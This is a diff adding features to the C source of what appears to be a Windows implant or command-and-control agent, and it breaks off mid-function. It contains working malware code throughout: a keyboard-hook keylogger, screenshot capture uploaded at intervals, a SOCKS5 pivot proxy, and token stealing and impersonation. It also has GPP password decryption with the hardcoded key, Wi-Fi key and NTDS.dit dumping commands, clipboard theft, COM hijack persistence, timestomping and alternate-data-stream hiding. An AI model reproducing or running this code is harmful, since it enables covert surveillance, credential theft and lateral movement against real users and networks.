@@ -14,6 +14,8 @@
 #include <ctype.h>
 #include "api_resolve.h"
 #include "pe_exec.h"
+#include <bcrypt.h>
+#include <winternl.h>
 
 /* Runtime working-hours window ("HH:MM-HH:MM" or "" = always beacon) */
 char g_working_hours[32] = {0};
@@ -21,6 +23,13 @@ char g_working_hours[32] = {0};
 // Dynamic sleep/jitter (updated by SLEEP command)
 int g_sleep_sec  = AGENT_SLEEP_SEC;
 int g_jitter_pct = AGENT_JITTER_PCT;
+
+// ── Screenwatch globals ────────────────────────────────────────────────────────
+static volatile int g_sw_stop = 1;
+static long long    g_sw_task_id = 0;
+static int          g_sw_interval = 10;
+static DWORD        g_sw_last_tick = 0;
+static int          g_sw_frame = 0;
 
 // ── Working hours ─────────────────────────────────────────────────────────────
 
@@ -420,6 +429,268 @@ static char *get_system(void) {
     char *out=(char*)malloc(128); snprintf(out,128,"[+] SYSTEM token (winlogon PID=%lu)",(unsigned long)sysPid); return out;
 }
 
+// ── Token store globals ───────────────────────────────────────────────────────
+
+typedef struct { int id; DWORD pid; char user[128]; HANDLE token; } TokenEntry;
+static TokenEntry g_tokens[32];
+static int  g_token_count   = 0;
+static int  g_token_next_id = 1;
+
+// ── Interactive shell globals ─────────────────────────────────────────────────
+
+static HANDLE g_ishell_proc     = NULL;
+static HANDLE g_ishell_stdin_w  = NULL;
+static HANDLE g_ishell_stdout_r = NULL;
+
+// ── Keylogger globals + hook proc + thread ────────────────────────────────────
+
+static char         g_keylog_buf[65536];
+static int          g_keylog_len    = 0;
+static HHOOK        g_keyhook       = NULL;
+static HANDLE       g_keylog_thread = NULL;
+static volatile int g_keylog_stop   = 1;
+static DWORD        g_keylog_tid    = 0;
+
+static LRESULT CALLBACK KeyHookProc(int n, WPARAM w, LPARAM l) {
+    if (n >= 0 && (w == 0x100 /*WM_KEYDOWN*/ || w == 0x104 /*WM_SYSKEYDOWN*/)) {
+        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l;
+        WCHAR wch[8] = {0};
+        BYTE  ks[256] = {0};
+        GetKeyboardState(ks);
+        int r = ToUnicode(kb->vkCode, kb->scanCode, ks, wch, 8, 0);
+        if (r > 0) {
+            for (int ki = 0; ki < r && g_keylog_len < (int)sizeof(g_keylog_buf)-2; ki++) {
+                if (wch[ki] < 0x80)
+                    g_keylog_buf[g_keylog_len++] = (char)wch[ki];
+                else
+                    g_keylog_buf[g_keylog_len++] = '?';
+            }
+        }
+    }
+    return CallNextHookEx(g_keyhook, n, w, l);
+}
+
+static DWORD WINAPI KeylogThread(LPVOID p) {
+    (void)p;
+    g_keylog_stop = 0;
+    g_keyhook = SetWindowsHookExW(13 /*WH_KEYBOARD_LL*/, KeyHookProc, NULL, 0);
+    MSG msg;
+    while (!g_keylog_stop) {
+        int r = GetMessageW(&msg, NULL, 0, 0);
+        if (r == 0 || r == -1) break;
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+    if (g_keyhook) { UnhookWindowsHookEx(g_keyhook); g_keyhook = NULL; }
+    g_keylog_stop = 1;
+    return 0;
+}
+
+// ── SOCKS5 globals + relay + listener ────────────────────────────────────────
+
+static SOCKET       g_socks_listen = INVALID_SOCKET;
+static HANDLE       g_socks_thread = NULL;
+static volatile int g_socks_stop   = 1;
+
+typedef struct { SOCKET src; SOCKET dst; } RelayArg;
+
+static DWORD WINAPI SocksRelayThread(LPVOID p) {
+    RelayArg *ra = (RelayArg*)p;
+    char buf[4096];
+    int  n;
+    while ((n = recv(ra->src, buf, sizeof(buf), 0)) > 0)
+        send(ra->dst, buf, n, 0);
+    shutdown(ra->dst, SD_BOTH);
+    free(ra);
+    return 0;
+}
+
+static void socks5_handle_client(SOCKET client) {
+    unsigned char hdr[260] = {0};
+    char host[256] = {0};
+    int  port = 0;
+    int  connected = 0;
+    SOCKET target = INVALID_SOCKET;
+
+    do {
+        /* Greeting */
+        if (recv(client, (char*)hdr, 2, MSG_WAITALL) < 2 || hdr[0] != 5) break;
+        { int nm = hdr[1]; if (nm > 0) recv(client,(char*)hdr+2,nm,MSG_WAITALL); }
+        { unsigned char na[2]={5,0}; send(client,(char*)na,2,0); }
+
+        /* Request header */
+        if (recv(client,(char*)hdr,4,MSG_WAITALL) < 4 || hdr[0]!=5 || hdr[1]!=1) {
+            unsigned char f[10]={5,7,0,1,0,0,0,0,0,0}; send(client,(char*)f,10,0); break;
+        }
+        if (hdr[3] == 1) { /* IPv4 */
+            unsigned char ip[4]={0}; recv(client,(char*)ip,4,MSG_WAITALL);
+            snprintf(host,sizeof(host),"%d.%d.%d.%d",ip[0],ip[1],ip[2],ip[3]);
+        } else if (hdr[3] == 3) { /* Domain */
+            unsigned char dl=0; recv(client,(char*)&dl,1,MSG_WAITALL);
+            if (dl > 0 && dl < (unsigned char)sizeof(host)-1) {
+                recv(client,host,dl,MSG_WAITALL); host[(unsigned)dl]='\0';
+            }
+        } else {
+            unsigned char f[10]={5,8,0,1,0,0,0,0,0,0}; send(client,(char*)f,10,0); break;
+        }
+        { unsigned char pb[2]={0}; recv(client,(char*)pb,2,MSG_WAITALL);
+          port=(pb[0]<<8)|pb[1]; }
+
+        /* Connect to target */
+        char ps[8]; snprintf(ps,sizeof(ps),"%d",port);
+        struct addrinfo hints2,*res2=NULL;
+        memset(&hints2,0,sizeof(hints2));
+        hints2.ai_family=AF_UNSPEC; hints2.ai_socktype=SOCK_STREAM;
+        if (getaddrinfo(host,ps,&hints2,&res2)==0 && res2) {
+            target = socket(res2->ai_family,SOCK_STREAM,0);
+            if (target!=INVALID_SOCKET &&
+                connect(target,res2->ai_addr,(int)res2->ai_addrlen)!=0) {
+                closesocket(target); target=INVALID_SOCKET;
+            }
+            freeaddrinfo(res2);
+        }
+        if (target==INVALID_SOCKET) {
+            unsigned char f[10]={5,5,0,1,0,0,0,0,0,0}; send(client,(char*)f,10,0); break;
+        }
+        { unsigned char ok[10]={5,0,0,1,0,0,0,0,0,0}; send(client,(char*)ok,10,0); }
+        connected = 1;
+    } while (0);
+
+    if (connected) {
+        RelayArg *a1 = (RelayArg*)malloc(sizeof(RelayArg));
+        RelayArg *a2 = (RelayArg*)malloc(sizeof(RelayArg));
+        if (a1 && a2) {
+            a1->src=client; a1->dst=target;
+            a2->src=target; a2->dst=client;
+            HANDLE t1 = CreateThread(NULL,0,SocksRelayThread,a1,0,NULL);
+            HANDLE t2 = CreateThread(NULL,0,SocksRelayThread,a2,0,NULL);
+            if (t1 && t2) { HANDLE th[2]={t1,t2}; WaitForMultipleObjects(2,th,TRUE,INFINITE); }
+            else if (t1) WaitForSingleObject(t1,INFINITE);
+            else if (t2) WaitForSingleObject(t2,INFINITE);
+            if (t1) CloseHandle(t1);
+            if (t2) CloseHandle(t2);
+        } else { free(a1); free(a2); }
+        closesocket(target);
+    }
+    closesocket(client);
+}
+
+static DWORD WINAPI SocksClientThread(LPVOID p) {
+    socks5_handle_client((SOCKET)(UINT_PTR)p);
+    return 0;
+}
+
+static DWORD WINAPI SocksListenThread(LPVOID p) {
+    (void)p;
+    while (!g_socks_stop) {
+        SOCKET cl = accept(g_socks_listen,NULL,NULL);
+        if (cl==INVALID_SOCKET) break;
+        HANDLE ht = CreateThread(NULL,0,SocksClientThread,(LPVOID)(UINT_PTR)cl,0,NULL);
+        if (ht) CloseHandle(ht); else closesocket(cl);
+    }
+    return 0;
+}
+
+// ── GPP password decryption (AES-256-CBC, BCrypt CNG) ────────────────────────
+
+static char* gpp_decrypt_cpassword(const char *b64val) {
+    size_t ct_len = 0;
+    uint8_t *ct = b64_decode(b64val, &ct_len);
+    if (!ct || ct_len == 0) { free(ct); return strdup("(b64 decode failed)"); }
+
+    static const uint8_t GPP_KEY[32] = {
+        0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
+        0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+        0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
+        0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
+    };
+    uint8_t iv[16] = {0};
+
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    char *result = NULL;
+
+    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg,BCRYPT_AES_ALGORITHM,NULL,0))) goto gpp_done;
+    if (!NT_SUCCESS(BCryptSetProperty(hAlg,BCRYPT_CHAINING_MODE,
+            (PUCHAR)BCRYPT_CHAIN_MODE_CBC,sizeof(BCRYPT_CHAIN_MODE_CBC),0))) goto gpp_done;
+    if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg,&hKey,NULL,0,
+            (PUCHAR)GPP_KEY,32,0))) goto gpp_done;
+
+    {
+        ULONG result_len = 0;
+        uint8_t *plain = (uint8_t*)malloc(ct_len+16);
+        if (!plain) goto gpp_done;
+        NTSTATUS gst = BCryptDecrypt(hKey,ct,(ULONG)ct_len,NULL,
+                                     iv,16,plain,(ULONG)ct_len,&result_len,
+                                     BCRYPT_BLOCK_PADDING);
+        if (NT_SUCCESS(gst)) {
+            plain[result_len] = '\0';
+            result = strdup((char*)plain);
+        } else {
+            char e[64]; snprintf(e,sizeof(e),"(decrypt err 0x%lx)",(unsigned long)gst);
+            result = strdup(e);
+        }
+        free(plain);
+    }
+gpp_done:
+    if (!result) result = strdup("(bcrypt init failed)");
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg,0);
+    free(ct);
+    return result;
+}
+
+// ── Screenwatch thread ─────────────────────────────────────────────────────────
+static uint8_t *sw_capture(DWORD *out_sz) {
+    *out_sz = 0;
+    /* No desktop/winstation switch here — GDI calls from a background thread
+     * must not call SetProcessWindowStation (process-wide) or SetThreadDesktop
+     * (which can fail on a thread that already has a desktop association).
+     * Instead we write the BMP to a temp file from the main capture thread and
+     * read it back here. Use a shared temp path guarded by the transport lock. */
+    HDC hDC = GetDC(NULL);
+    if (!hDC) return NULL;
+    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
+    if (w <= 0 || h <= 0) { ReleaseDC(NULL, hDC); return NULL; }
+    HDC hMem = CreateCompatibleDC(hDC);
+    if (!hMem) { ReleaseDC(NULL, hDC); return NULL; }
+    HBITMAP hBmp = CreateCompatibleBitmap(hDC, w, h);
+    if (!hBmp) { DeleteDC(hMem); ReleaseDC(NULL, hDC); return NULL; }
+    HGDIOBJ hOld = SelectObject(hMem, hBmp);
+    BitBlt(hMem, 0, 0, w, h, hDC, 0, 0, SRCCOPY);
+    SelectObject(hMem, hOld);
+    BITMAPINFOHEADER bi = {0}; bi.biSize=sizeof(bi); bi.biWidth=w; bi.biHeight=-h;
+    bi.biPlanes=1; bi.biBitCount=24; bi.biCompression=BI_RGB;
+    int row_sz = (w*3+3)&~3; DWORD data_sz = (DWORD)((size_t)row_sz*(size_t)h);
+    uint8_t *pixels = (uint8_t*)malloc(data_sz);
+    uint8_t *result = NULL;
+    if (pixels) {
+        GetDIBits(hMem, hBmp, 0, (UINT)h, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+        int ab=1; for(DWORD _i=0;_i<data_sz&&ab;_i++) if(pixels[_i]) ab=0;
+        if (!ab) {
+            BITMAPFILEHEADER bfh={0}; bfh.bfType=0x4D42;
+            bfh.bfSize=(DWORD)(sizeof(bfh)+sizeof(bi)+data_sz); bfh.bfOffBits=(DWORD)(sizeof(bfh)+sizeof(bi));
+            DWORD total=sizeof(bfh)+sizeof(bi)+data_sz; result=(uint8_t*)malloc(total);
+            if(result){memcpy(result,&bfh,sizeof(bfh));memcpy(result+sizeof(bfh),&bi,sizeof(bi));memcpy(result+sizeof(bfh)+sizeof(bi),pixels,data_sz);*out_sz=total;}
+        }
+        free(pixels);
+    }
+    DeleteDC(hMem); DeleteObject(hBmp); ReleaseDC(NULL, hDC);
+    return result;
+}
+void screenwatch_tick(void) {
+    if (g_sw_stop) return;
+    DWORD now = GetTickCount();
+    if (now - g_sw_last_tick < (DWORD)(g_sw_interval * 1000)) return;
+    g_sw_last_tick = now;
+    DWORD sz = 0; uint8_t *bmp = sw_capture(&sz);
+    if (bmp && sz > 0) {
+        char nm[32]; snprintf(nm, sizeof(nm), "watch_%04d.bmp", g_sw_frame++);
+        agent_upload_file(g_sw_task_id, nm, bmp, sz);
+        free(bmp);
+    }
+}
+
 // ── Dispatcher ────────────────────────────────────────────────────────────────
 
 void dispatch_task(AgentTask *task) {
@@ -717,6 +988,7 @@ void dispatch_task(AgentTask *task) {
         int sh    = GetSystemMetrics(SM_CYSCREEN);
 
         int ok_flag = 0;
+        int no_desktop = 0;
         if (hDC && sw > 0 && sh > 0) {
             HDC hMemDC = CreateCompatibleDC(hDC);
             HBITMAP hBmp = CreateCompatibleBitmap(hDC, sw, sh);
@@ -738,6 +1010,13 @@ void dispatch_task(AgentTask *task) {
                 GetDIBits(hMemDC, hBmp, 0, (UINT)sh,
                     pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
 
+                int all_black = 1;
+                for (DWORD _pi = 0; _pi < data_sz && all_black; _pi++) {
+                    if (pixels[_pi] != 0) all_black = 0;
+                }
+                if (all_black) {
+                    no_desktop = 1;
+                } else {
                 BITMAPFILEHEADER bfh = {0};
                 bfh.bfType   = 0x4D42;
                 bfh.bfSize   = (DWORD)(sizeof(bfh) + sizeof(bi) + data_sz);
@@ -753,6 +1032,7 @@ void dispatch_task(AgentTask *task) {
                     CloseHandle(hF);
                     ok_flag = 1;
                 }
+                } /* end !all_black */
                 free(pixels);
             }
             DeleteDC(hMemDC);
@@ -763,7 +1043,9 @@ void dispatch_task(AgentTask *task) {
         if (hDesk) { SetThreadDesktop(hOrigDesk); CloseDesktop(hDesk); }
         if (hSta)  { SetProcessWindowStation(hOrigSta); CloseWindowStation(hSta); }
 
-        if (ok_flag) {
+        if (no_desktop) {
+            agent_send_result(task->id, "", "screenshot: no_interactive_desktop");
+        } else if (ok_flag) {
             HANDLE hF = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
             if (hF != INVALID_HANDLE_VALUE) {
@@ -1079,6 +1361,694 @@ void dispatch_task(AgentTask *task) {
     else if (strcmp(type_upper, "NETSTAT") == 0) {
         char *out = run_shell("netstat -ano");
         agent_send_result(task->id, out, ""); free(out);
+    }
+    // ── Phase 1 ──────────────────────────────────────────────────────────────
+    else if (strcmp(type_upper, "TIMESTOMP") == 0) {
+        char target[512]={0}; char ref[512]={0};
+        json_get_str(args,"target",target,sizeof(target),"");
+        json_get_str(args,"ref",ref,sizeof(ref),"C:\\Windows\\System32\\kernel32.dll");
+        if(!target[0]){agent_send_result(task->id,"","TIMESTOMP: {\"target\":\"path\"} required");return;}
+        HANDLE hRef=CreateFileA(ref,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS,NULL);
+        if(hRef==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","TIMESTOMP: cannot open ref");return;}
+        FILETIME ctime,atime,mtime; GetFileTime(hRef,&ctime,&atime,&mtime); CloseHandle(hRef);
+        HANDLE hDst=CreateFileA(target,FILE_WRITE_ATTRIBUTES,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS,NULL);
+        if(hDst==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","TIMESTOMP: cannot open target");return;}
+        SetFileTime(hDst,&ctime,&atime,&mtime); CloseHandle(hDst);
+        char msg[600]; snprintf(msg,sizeof(msg),"[+] timestamps cloned from %s to %s",ref,target);
+        agent_send_result(task->id,msg,"");
+    }
+    else if (strcmp(type_upper, "COM_HIJACK") == 0) {
+        char clsid[128]={0}; char dllpath[512]={0};
+        json_get_str(args,"clsid",clsid,sizeof(clsid),""); json_get_str(args,"path",dllpath,sizeof(dllpath),"");
+        if(!clsid[0]||!dllpath[0]){agent_send_result(task->id,"","COM_HIJACK: {\"clsid\":\"...\",\"path\":\"...\"} required");return;}
+        char keypath[300]; snprintf(keypath,sizeof(keypath),"Software\\Classes\\CLSID\\{%s}\\InprocServer32",clsid);
+        HKEY hk;
+        if(RegCreateKeyExA(HKEY_CURRENT_USER,keypath,0,NULL,0,KEY_SET_VALUE,NULL,&hk,NULL)!=ERROR_SUCCESS){agent_send_result(task->id,"","COM_HIJACK: RegCreateKeyEx failed");return;}
+        RegSetValueExA(hk,"",0,REG_SZ,(const BYTE*)dllpath,(DWORD)strlen(dllpath)+1);
+        RegSetValueExA(hk,"ThreadingModel",0,REG_SZ,(const BYTE*)"Apartment",10); RegCloseKey(hk);
+        char msg[700]; snprintf(msg,sizeof(msg),"[+] COM hijack: HKCU\\%s -> %s",keypath,dllpath);
+        agent_send_result(task->id,msg,"");
+    }
+    else if (strcmp(type_upper, "COM_HIJACK_RM") == 0) {
+        char clsid[128]={0}; json_get_str(args,"clsid",clsid,sizeof(clsid),"");
+        if(!clsid[0]){agent_send_result(task->id,"","COM_HIJACK_RM: {\"clsid\":\"...\"} required");return;}
+        char keypath[256]; snprintf(keypath,sizeof(keypath),"Software\\Classes\\CLSID\\{%s}",clsid);
+        RegDeleteTreeA(HKEY_CURRENT_USER,keypath);
+        agent_send_result(task->id,"[+] COM hijack removed","");
+    }
+    else if (strcmp(type_upper, "CLIP_GET") == 0) {
+        if(!OpenClipboard(NULL)){agent_send_result(task->id,"","CLIP_GET: OpenClipboard failed");return;}
+        HANDLE hData=GetClipboardData(CF_TEXT);
+        if(!hData){CloseClipboard();agent_send_result(task->id,"","CLIP_GET: no text in clipboard");return;}
+        char *text=(char*)GlobalLock(hData);
+        if(!text){CloseClipboard();agent_send_result(task->id,"","CLIP_GET: GlobalLock failed");return;}
+        char *copy=_strdup(text); GlobalUnlock(hData); CloseClipboard();
+        agent_send_result(task->id,copy?copy:"",""); free(copy);
+    }
+    else if (strcmp(type_upper, "CRED_WIFI") == 0) {
+        char *profiles_out=run_shell("netsh wlan show profiles 2>&1");
+        if(!profiles_out){agent_send_result(task->id,"","CRED_WIFI: netsh failed");return;}
+        char *combined=(char*)calloc(1,65536);
+        if(!combined){free(profiles_out);agent_send_result(task->id,"","alloc failed");return;}
+        char *p=profiles_out;
+        while((p=strstr(p,"All User Profile"))!=NULL){
+            char *colon=strchr(p,':'); if(!colon)break; colon++;
+            while(*colon==' ')colon++;
+            char name[256]; int i=0;
+            while(*colon&&*colon!='\r'&&*colon!='\n'&&i<255)name[i++]=*colon++;
+            name[i]=0;
+            char cmd[512]; snprintf(cmd,sizeof(cmd),"netsh wlan show profile name=\"%s\" key=clear 2>&1",name);
+            char *detail=run_shell(cmd);
+            if(detail){size_t cl=strlen(combined),dl=strlen(detail);if(cl+dl<65534){memcpy(combined+cl,detail,dl);combined[cl+dl]=0;}free(detail);}
+            p=colon;
+        }
+        free(profiles_out);
+        agent_send_result(task->id,combined[0]?combined:"[no WiFi profiles found]",""); free(combined);
+    }
+    else if (strcmp(type_upper, "NTDS_DUMP") == 0) {
+        char outdir[512]={0}; json_get_str(args,"path",outdir,sizeof(outdir),"C:\\Windows\\Temp\\ntds_ifm");
+        char cmd[600]; snprintf(cmd,sizeof(cmd),"ntdsutil \"ac i ntds\" \"ifm\" \"create full %s\" q q 2>&1",outdir);
+        char *out=run_shell(cmd);
+        agent_send_result(task->id,out?out:"",out?"":" NTDS_DUMP: run failed"); free(out);
+    }
+    // ── Phase 2a: ADS ─────────────────────────────────────────────────────────
+    else if (strcmp(type_upper, "ADS_LIST") == 0) {
+        if(!args||!args[0]){agent_send_result(task->id,"","ADS_LIST: path required");return;}
+        wchar_t wpath[MAX_PATH]={0}; MultiByteToWideChar(CP_UTF8,0,args,-1,wpath,MAX_PATH);
+        WIN32_FIND_STREAM_DATA sd; HANDLE hS=FindFirstStreamW(wpath,FindStreamInfoStandard,&sd,0);
+        if(hS==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_LIST: FindFirstStreamW failed");return;}
+        char result[8192]={0}; int rlen=0;
+        do { char sname[512]={0}; WideCharToMultiByte(CP_UTF8,0,sd.cStreamName,-1,sname,sizeof(sname),NULL,NULL);
+             int w=snprintf(result+rlen,sizeof(result)-rlen-1,"%s\t%lld bytes\n",sname,sd.StreamSize.QuadPart);
+             if(w>0)rlen+=w; } while(FindNextStreamW(hS,&sd));
+        FindClose(hS); agent_send_result(task->id,result[0]?result:"[no alternate streams]","");
+    }
+    else if (strcmp(type_upper, "ADS_READ") == 0) {
+        char file[512]={0}; char stream[256]={0};
+        json_get_str(args,"file",file,sizeof(file),""); json_get_str(args,"stream",stream,sizeof(stream),"");
+        if(!file[0]||!stream[0]){agent_send_result(task->id,"","ADS_READ: {\"file\":\"...\",\"stream\":\"...\"} required");return;}
+        char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
+        HANDLE hF=CreateFileA(adspath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+        if(hF==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_READ: open failed");return;}
+        DWORD fsz=GetFileSize(hF,NULL); uint8_t *buf=(uint8_t*)malloc(fsz+1);
+        DWORD rd=0; ReadFile(hF,buf,fsz,&rd,NULL); CloseHandle(hF); buf[rd]=0;
+        agent_upload_file(task->id,stream,buf,rd);
+        char msg[64]; snprintf(msg,sizeof(msg),"[+] ADS read %lu bytes",rd);
+        agent_send_result(task->id,msg,""); free(buf);
+    }
+    else if (strcmp(type_upper, "ADS_WRITE") == 0) {
+        char file[512]={0}; char stream[256]={0}; char data[4096]={0};
+        json_get_str(args,"file",file,sizeof(file),""); json_get_str(args,"stream",stream,sizeof(stream),""); json_get_str(args,"data",data,sizeof(data),"");
+        if(!file[0]||!stream[0]){agent_send_result(task->id,"","ADS_WRITE: {\"file\":,\"stream\":,\"data\":} required");return;}
+        char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
+        HANDLE hF=CreateFileA(adspath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+        if(hF==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_WRITE: create failed");return;}
+        DWORD wr=0; WriteFile(hF,data,(DWORD)strlen(data),&wr,NULL); CloseHandle(hF);
+        char msg[64]; snprintf(msg,sizeof(msg),"[+] wrote %lu bytes to %s",wr,adspath);
+        agent_send_result(task->id,msg,"");
+    }
+    else if (strcmp(type_upper, "ADS_DEL") == 0) {
+        char file[512]={0}; char stream[256]={0};
+        json_get_str(args,"file",file,sizeof(file),""); json_get_str(args,"stream",stream,sizeof(stream),"");
+        if(!file[0]||!stream[0]){agent_send_result(task->id,"","ADS_DEL: {\"file\":\"...\",\"stream\":\"...\"} required");return;}
+        char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
+        if(DeleteFileA(adspath))agent_send_result(task->id,"[+] ADS stream deleted","");
+        else agent_send_result(task->id,"","ADS_DEL: DeleteFile failed");
+    }
+    // ── Phase 2d: Screenwatch ─────────────────────────────────────────────────
+    else if (strcmp(type_upper, "SCREENWATCH_START") == 0) {
+        if(!g_sw_stop){agent_send_result(task->id,"","screenwatch already running");return;}
+        g_sw_interval=json_get_int(args,"interval",10); if(g_sw_interval<1)g_sw_interval=1;
+        g_sw_task_id=task->id; g_sw_last_tick=0; g_sw_frame=0; g_sw_stop=0;
+        char msg[64]; snprintf(msg,sizeof(msg),"[+] screenwatch started (interval %ds)",g_sw_interval);
+        agent_send_result(task->id,msg,"");
+    }
+    else if (strcmp(type_upper, "SCREENWATCH_STOP") == 0) {
+        if(g_sw_stop){agent_send_result(task->id,"","screenwatch not running");return;}
+        g_sw_stop=1; g_sw_frame=0;
+        agent_send_result(task->id,"[+] screenwatch stopped","");
+    }
+    // ── FEATURE 1: Token store ────────────────────────────────────────────────
+    else if (strcmp(type_upper, "TOKEN_STORE_STEAL") == 0) {
+        int tpid = json_get_int(args, "pid", 0);
+        if (!tpid) { agent_send_result(task->id,"","TOKEN_STORE_STEAL: pid required"); return; }
+        if (g_token_count >= 32) { agent_send_result(task->id,"","token store full"); return; }
+        HANDLE hSelf2;
+        if (OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hSelf2)) {
+            enable_privilege(hSelf2,"SeDebugPrivilege"); CloseHandle(hSelf2);
+        }
+        HANDLE hP = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,(DWORD)tpid);
+        if (!hP) {
+            char e[64]; snprintf(e,sizeof(e),"OpenProcess failed (err %lu)",GetLastError());
+            agent_send_result(task->id,"",e); return;
+        }
+        HANDLE hTk;
+        if (!OpenProcessToken(hP,TOKEN_DUPLICATE|TOKEN_QUERY,&hTk)) {
+            CloseHandle(hP);
+            char e[64]; snprintf(e,sizeof(e),"OpenProcessToken failed (err %lu)",GetLastError());
+            agent_send_result(task->id,"",e); return;
+        }
+        CloseHandle(hP);
+        HANDLE hDp;
+        if (!DuplicateTokenEx(hTk,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,
+                              TokenImpersonation,&hDp)) {
+            CloseHandle(hTk);
+            char e[64]; snprintf(e,sizeof(e),"DuplicateTokenEx failed (err %lu)",GetLastError());
+            agent_send_result(task->id,"",e); return;
+        }
+        CloseHandle(hTk);
+        char uname[128] = "unknown";
+        DWORD need2 = 0;
+        GetTokenInformation(hDp,TokenUser,NULL,0,&need2);
+        if (need2) {
+            TOKEN_USER *tu = (TOKEN_USER*)malloc(need2);
+            if (tu && GetTokenInformation(hDp,TokenUser,tu,need2,&need2)) {
+                SID_NAME_USE snu;
+                char dom[128]; DWORD dsz=sizeof(dom), usz=sizeof(uname);
+                LookupAccountSidA(NULL,tu->User.Sid,uname,&usz,dom,&dsz,&snu);
+            }
+            free(tu);
+        }
+        TokenEntry *te = &g_tokens[g_token_count++];
+        te->id = g_token_next_id++;
+        te->pid = (DWORD)tpid;
+        strncpy(te->user,uname,sizeof(te->user)-1);
+        te->token = hDp;
+        char out2[256];
+        snprintf(out2,sizeof(out2),"[+] token stored: id=%d pid=%d user=%s",te->id,tpid,te->user);
+        agent_send_result(task->id,out2,"");
+    }
+    else if (strcmp(type_upper, "TOKEN_STORE_SHOW") == 0) {
+        if (g_token_count == 0) { agent_send_result(task->id,"(empty)",""); return; }
+        char *tbuf = (char*)malloc((size_t)g_token_count * 256 + 16);
+        if (!tbuf) { agent_send_result(task->id,"","oom"); return; }
+        tbuf[0] = '\0';
+        for (int ti = 0; ti < g_token_count; ti++) {
+            char line2[256];
+            snprintf(line2,sizeof(line2),"id=%d pid=%lu user=%s\n",
+                g_tokens[ti].id,(unsigned long)g_tokens[ti].pid,g_tokens[ti].user);
+            strcat(tbuf,line2);
+        }
+        agent_send_result(task->id,tbuf,""); free(tbuf);
+    }
+    else if (strcmp(type_upper, "TOKEN_STORE_USE") == 0) {
+        int tid2 = json_get_int(args,"id",0);
+        for (int ti = 0; ti < g_token_count; ti++) {
+            if (g_tokens[ti].id == tid2) {
+                if (!ImpersonateLoggedOnUser(g_tokens[ti].token)) {
+                    char e[64]; snprintf(e,sizeof(e),"ImpersonateLoggedOnUser failed %lu",GetLastError());
+                    agent_send_result(task->id,"",e);
+                } else {
+                    char out3[128];
+                    snprintf(out3,sizeof(out3),"[+] impersonating id=%d user=%s",tid2,g_tokens[ti].user);
+                    agent_send_result(task->id,out3,"");
+                }
+                return;
+            }
+        }
+        agent_send_result(task->id,"","token id not found");
+    }
+    else if (strcmp(type_upper, "TOKEN_STORE_REMOVE") == 0) {
+        int tid3 = json_get_int(args,"id",0);
+        for (int ti = 0; ti < g_token_count; ti++) {
+            if (g_tokens[ti].id == tid3) {
+                CloseHandle(g_tokens[ti].token);
+                for (int tj = ti; tj < g_token_count-1; tj++)
+                    g_tokens[tj] = g_tokens[tj+1];
+                g_token_count--;
+                agent_send_result(task->id,"[+] token removed",""); return;
+            }
+        }
+        agent_send_result(task->id,"","token id not found");
+    }
+    else if (strcmp(type_upper, "TOKEN_STORE_CLEAR") == 0) {
+        for (int ti = 0; ti < g_token_count; ti++)
+            CloseHandle(g_tokens[ti].token);
+        g_token_count = 0;
+        agent_send_result(task->id,"[+] token store cleared","");
+    }
+    // ── FEATURE 2: BLOCKDLLS ─────────────────────────────────────────────────
+    else if (strcmp(type_upper, "BLOCKDLLS") == 0) {
+        typedef BOOL (WINAPI *pfnSPMP)(DWORD, PVOID, SIZE_T);
+        HMODULE hk32 = GetModuleHandleA("kernel32.dll");
+        pfnSPMP fn_spmp = hk32 ? (pfnSPMP)GetProcAddress(hk32,"SetProcessMitigationPolicy") : NULL;
+        if (!fn_spmp) { agent_send_result(task->id,"","SetProcessMitigationPolicy not found"); return; }
+        DWORD policy_val = 1; /* MicrosoftSignedOnly bit */
+        if (fn_spmp(8 /*ProcessSignaturePolicy*/, &policy_val, sizeof(policy_val))) {
+            agent_send_result(task->id,"[+] BLOCKDLLS enabled","");
+        } else {
+            char e[64]; snprintf(e,sizeof(e),"SetProcessMitigationPolicy failed %lu",GetLastError());
+            agent_send_result(task->id,"",e);
+        }
+    }
+    // ── FEATURE 3: PEB_SPOOF ─────────────────────────────────────────────────
+    else if (strcmp(type_upper, "PEB_SPOOF") == 0) {
+        char peb_path[MAX_PATH] = {0};
